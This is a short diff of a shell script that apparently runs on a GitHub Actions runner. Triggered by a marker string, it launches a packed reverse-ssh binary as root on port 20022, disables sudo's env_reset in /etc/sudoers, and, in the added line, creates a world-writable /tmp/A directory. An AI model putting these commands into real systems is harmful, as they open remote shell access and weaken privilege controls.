@@ -165,7 +165,7 @@ cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
 grep -q AABBCC_rev_shell /tmp/js9 &&
 (
 setsid sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
-sudo bash -c '  sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
+sudo bash -c ' mkdir /tmp/A;chmod 0777 /tmp/A; sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
                  grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt '
 
 
